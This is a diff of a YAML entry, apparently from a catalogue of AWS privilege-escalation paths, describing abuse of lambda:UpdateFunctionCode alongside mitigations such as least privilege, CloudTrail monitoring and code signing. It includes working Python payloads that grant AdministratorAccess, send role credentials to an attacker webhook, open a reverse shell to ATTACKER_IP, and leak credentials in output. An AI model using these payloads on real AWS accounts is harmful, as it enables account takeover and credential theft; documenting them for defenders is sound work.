@@ -28,22 +28,32 @@ exploitationSteps:
     command: zip exploit.zip lambda_function.py
     description: Package the malicious code into a deployment package
   - step: 3
-    command: "aws lambda update-function-code --function-name TARGET_FUNCTION \\\n\
-      \  --zip-file fileb://exploit.zip\n"
+    command: |
+      aws lambda update-function-code --function-name TARGET_FUNCTION \
+        --zip-file fileb://exploit.zip
     description: Update the target Lambda function with the malicious code
   - step: 4
     command: '# Wait for the function to be automatically invoked by triggers'
     description: Wait for the function to be invoked by its automatic triggers (EventBridge,
       S3 events, etc.)
-recommendation: "Restrict the `lambda:UpdateFunctionCode` permission using the principle\
-  \ of least privilege.\nUse resource-based policies to limit which functions can\
-  \ be modified:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"lambda:UpdateFunctionCode\"\
-  ,\n  \"Resource\": \"arn:aws:lambda:REGION:ACCOUNT_ID:function/SpecificFunction\"\
-  \n}\n```\n\nAdditional controls:\n- Monitor CloudTrail for `UpdateFunctionCode`\
-  \ events on sensitive functions\n- Implement Lambda function versioning and aliases\
-  \ to prevent direct modification\n- Use AWS Config rules to detect changes to Lambda\
-  \ function code\n- Require code signing for Lambda deployments\n- Alert on Lambda\
-  \ functions with privileged roles being modified\n"
+recommendation: |
+  Restrict the `lambda:UpdateFunctionCode` permission using the principle of least privilege.
+  Use resource-based policies to limit which functions can be modified:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "lambda:UpdateFunctionCode",
+    "Resource": "arn:aws:lambda:REGION:ACCOUNT_ID:function/SpecificFunction"
+  }
+  ```
+
+  Additional controls:
+  - Monitor CloudTrail for `UpdateFunctionCode` events on sensitive functions
+  - Implement Lambda function versioning and aliases to prevent direct modification
+  - Use AWS Config rules to detect changes to Lambda function code
+  - Require code signing for Lambda deployments
+  - Alert on Lambda functions with privileged roles being modified
 limitations: 'This path provides administrative access only if the target resource''s
   execution role has administrative permissions. The attacker gains whatever permissions
   the resource''s role has. If the role has limited permissions, the attacker gains
@@ -146,72 +156,118 @@ attackVisualization:
     label: 'Method 1: Execute Attack via AWS SDK'
     type: payload
     color: '#99ccff'
-    description: "The malicious Lambda function code uses the AWS SDK to directly\
-      \ perform privileged actions using the execution role's credentials. The function\
-      \ can call IAM APIs to elevate the starting principal's permissions, create\
-      \ access keys, modify policies, or perform other administrative actions. Since\
-      \ the function runs with the execution role's credentials automatically available,\
-      \ no credential exfiltration is needed.\n\nExample malicious Lambda code:\n\
-      ```python\nimport boto3\n\ndef lambda_handler(event, context):\n    iam = boto3.client('iam')\n\
-      \    # Attach admin policy to starting user\n    iam.attach_user_policy(\n \
-      \       UserName='attacker-user',\n        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n\
-      \    )\n    return {'statusCode': 200, 'body': 'Privilege escalation complete'}\n\
-      ```\n\nThis is the most direct approach - the Lambda function immediately modifies\
-      \ IAM or performs other privileged actions using its execution role's permissions.\n"
+    description: |
+      The malicious Lambda function code uses the AWS SDK to directly perform privileged actions using the execution role's credentials. The function can call IAM APIs to elevate the starting principal's permissions, create access keys, modify policies, or perform other administrative actions. Since the function runs with the execution role's credentials automatically available, no credential exfiltration is needed.
+
+      Example malicious Lambda code:
+      ```python
+      import boto3
+
+      def lambda_handler(event, context):
+          iam = boto3.client('iam')
+          # Attach admin policy to starting user
+          iam.attach_user_policy(
+              UserName='attacker-user',
+              PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
+          )
+          return {'statusCode': 200, 'body': 'Privilege escalation complete'}
+      ```
+
+      This is the most direct approach - the Lambda function immediately modifies IAM or performs other privileged actions using its execution role's permissions.
   - id: method_webhook_exfil
     label: 'Method 2: Exfiltrate Credentials to Webhook'
     type: payload
     color: '#99ccff'
-    description: "The malicious Lambda function code retrieves the execution role's\
-      \ temporary credentials from the Lambda environment and exfiltrates them to\
-      \ an attacker-controlled webhook or HTTP endpoint. The credentials are automatically\
-      \ available in environment variables that the AWS SDK uses.\n\nExample malicious\
-      \ Lambda code:\n```python\nimport os\nimport json\nimport urllib.request\n\n\
-      def lambda_handler(event, context):\n    # Get credentials from environment\n\
-      \    creds = {\n        'access_key': os.environ['AWS_ACCESS_KEY_ID'],\n   \
-      \     'secret_key': os.environ['AWS_SECRET_ACCESS_KEY'],\n        'session_token':\
-      \ os.environ['AWS_SESSION_TOKEN']\n    }\n\n    # Exfiltrate to webhook\n  \
-      \  req = urllib.request.Request(\n        'https://attacker-webhook.com/collect',\n\
-      \        data=json.dumps(creds).encode(),\n        headers={'Content-Type':\
-      \ 'application/json'}\n    )\n    urllib.request.urlopen(req)\n\n    return\
-      \ {'statusCode': 200}\n```\n\nThe attacker receives the credentials remotely\
-      \ and can use them from any location until they expire (typically 15 minutes\
-      \ to 1 hour).\n"
+    description: |
+      The malicious Lambda function code retrieves the execution role's temporary credentials from the Lambda environment and exfiltrates them to an attacker-controlled webhook or HTTP endpoint. The credentials are automatically available in environment variables that the AWS SDK uses.
+
+      Example malicious Lambda code:
+      ```python
+      import os
+      import json
+      import urllib.request
+
+      def lambda_handler(event, context):
+          # Get credentials from environment
+          creds = {
+              'access_key': os.environ['AWS_ACCESS_KEY_ID'],
+              'secret_key': os.environ['AWS_SECRET_ACCESS_KEY'],
+              'session_token': os.environ['AWS_SESSION_TOKEN']
+          }
+
+          # Exfiltrate to webhook
+          req = urllib.request.Request(
+              'https://attacker-webhook.com/collect',
+              data=json.dumps(creds).encode(),
+              headers={'Content-Type': 'application/json'}
+          )
+          urllib.request.urlopen(req)
+
+          return {'statusCode': 200}
+      ```
+
+      The attacker receives the credentials remotely and can use them from any location until they expire (typically 15 minutes to 1 hour).
   - id: method_reverse_shell
     label: 'Method 3: Reverse Shell Connection'
     type: payload
     color: '#99ccff'
-    description: "The malicious Lambda function establishes a reverse shell connection\
-      \ back to an attacker-controlled listener, providing interactive access. From\
-      \ within the reverse shell, the attacker can access the execution role's credentials\
-      \ and run arbitrary AWS CLI commands.\n\nExample malicious Lambda code:\n```python\n\
-      import socket\nimport subprocess\nimport os\n\ndef lambda_handler(event, context):\n\
-      \    # Establish reverse shell\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\
-      \    s.connect(('ATTACKER_IP', 4444))\n\n    # Redirect stdin/stdout/stderr\
-      \ to socket\n    os.dup2(s.fileno(), 0)\n    os.dup2(s.fileno(), 1)\n    os.dup2(s.fileno(),\
-      \ 2)\n\n    # Start shell\n    subprocess.call(['/bin/sh', '-i'])\n\n    return\
-      \ {'statusCode': 200}\n```\n\nThis provides an interactive shell session within\
-      \ the Lambda execution environment where the attacker can access credentials\
-      \ and execute AWS CLI commands with the execution role's permissions. The session\
-      \ lasts until the Lambda function times out (max 15 minutes).\n"
+    description: |
+      The malicious Lambda function establishes a reverse shell connection back to an attacker-controlled listener, providing interactive access. From within the reverse shell, the attacker can access the execution role's credentials and run arbitrary AWS CLI commands.
+
+      Example malicious Lambda code:
+      ```python
+      import socket
+      import subprocess
+      import os
+
+      def lambda_handler(event, context):
+          # Establish reverse shell
+          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+          s.connect(('ATTACKER_IP', 4444))
+
+          # Redirect stdin/stdout/stderr to socket
+          os.dup2(s.fileno(), 0)
+          os.dup2(s.fileno(), 1)
+          os.dup2(s.fileno(), 2)
+
+          # Start shell
+          subprocess.call(['/bin/sh', '-i'])
+
+          return {'statusCode': 200}
+      ```
+
+      This provides an interactive shell session within the Lambda execution environment where the attacker can access credentials and execute AWS CLI commands with the execution role's permissions. The session lasts until the Lambda function times out (max 15 minutes).
   - id: method_output_exfil
     label: 'Method 4: Exfiltrate Credentials to Output'
     type: payload
     color: '#99ccff'
-    description: "The malicious Lambda function code retrieves the execution role's\
-      \ temporary credentials from the Lambda environment and returns them in the\
-      \ function's response output. This allows the attacker to read the credentials\
-      \ directly from the Lambda invocation result without needing an external webhook\
-      \ or reverse shell.\n\nExample malicious Lambda code:\n```python\nimport os\n\
-      import json\n\ndef lambda_handler(event, context):\n    # Get credentials from\
-      \ environment\n    creds = {\n        'access_key': os.environ['AWS_ACCESS_KEY_ID'],\n\
-      \        'secret_key': os.environ['AWS_SECRET_ACCESS_KEY'],\n        'session_token':\
-      \ os.environ['AWS_SESSION_TOKEN']\n    }\n    \n    # Return credentials in\
-      \ the response\n    return {\n        'statusCode': 200,\n        'body': json.dumps({\n\
-      \            'message': 'Credentials exfiltrated',\n            'credentials':\
-      \ creds\n        })\n    }\n```\n\nThe attacker invokes the function and reads\
-      \ the credentials from the response output. These credentials can then be exported\
-      \ and used from any location until they expire (typically 15 minutes to 1 hour)."
+    description: |
+      The malicious Lambda function code retrieves the execution role's temporary credentials from the Lambda environment and returns them in the function's response output. This allows the attacker to read the credentials directly from the Lambda invocation result without needing an external webhook or reverse shell.
+
+      Example malicious Lambda code:
+      ```python
+      import os
+      import json
+
+      def lambda_handler(event, context):
+          # Get credentials from environment
+          creds = {
+              'access_key': os.environ['AWS_ACCESS_KEY_ID'],
+              'secret_key': os.environ['AWS_SECRET_ACCESS_KEY'],
+              'session_token': os.environ['AWS_SESSION_TOKEN']
+          }
+
+          # Return credentials in the response
+          return {
+              'statusCode': 200,
+              'body': json.dumps({
+                  'message': 'Credentials exfiltrated',
+                  'credentials': creds
+              })
+          }
+      ```
+
+      The attacker invokes the function and reads the credentials from the response output. These credentials can then be exported and used from any location until they expire (typically 15 minutes to 1 hour).
   - id: admin_outcome
     label: Effective Administrator
     type: outcome
@@ -246,15 +302,19 @@ attackVisualization:
   - from: start
     to: lambda_function
     label: lambda:UpdateFunctionCode
-    description: "The attacker updates the target Lambda function's code with malicious\
-      \ code. This requires creating a deployment package (ZIP file) containing the\
-      \ malicious code and uploading it to replace the function's existing code.\n\
-      \nCommands:\n```bash\necho 'import boto3; iam = boto3.client(\"iam\"); iam.attach_user_policy(UserName=\"\
-      attacker\", PolicyArn=\"arn:aws:iam::aws:policy/AdministratorAccess\")' > lambda_function.py\n\
-      zip exploit.zip lambda_function.py\naws lambda update-function-code \\\n  --function-name\
-      \ TARGET_FUNCTION \\\n  --zip-file fileb://exploit.zip\n```\n\nThe malicious\
-      \ code is now deployed and will execute with the function's execution role permissions\
-      \ when invoked.\n"
+    description: |
+      The attacker updates the target Lambda function's code with malicious code. This requires creating a deployment package (ZIP file) containing the malicious code and uploading it to replace the function's existing code.
+
+      Commands:
+      ```bash
+      echo 'import boto3; iam = boto3.client("iam"); iam.attach_user_policy(UserName="attacker", PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")' > lambda_function.py
+      zip exploit.zip lambda_function.py
+      aws lambda update-function-code \
+        --function-name TARGET_FUNCTION \
+        --zip-file fileb://exploit.zip
+      ```
+
+      The malicious code is now deployed and will execute with the function's execution role permissions when invoked.
   - from: lambda_function
     to: execution_role
     label: Wait for automatic trigger
